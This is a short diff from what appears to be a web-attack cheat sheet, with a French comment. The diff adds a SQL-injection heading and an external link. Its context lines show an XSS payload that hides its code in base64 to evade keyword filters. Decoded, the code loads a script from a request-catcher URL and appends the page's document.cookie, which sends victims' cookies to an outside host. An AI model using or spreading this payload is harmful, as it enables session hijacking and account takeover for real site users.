@@ -22,3 +22,7 @@ document.body.appendChild(script);
 // Pour bypass les filtres qui recherchent des mots clés : base64 encoded payload
 <body onload="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9idXN0ZXJiYXh0ZXIucmVxdWVzdGNhdGNoZXIuY29tLyIgKyBkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))">
 ```
+
+## Injection SQL
+
+https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
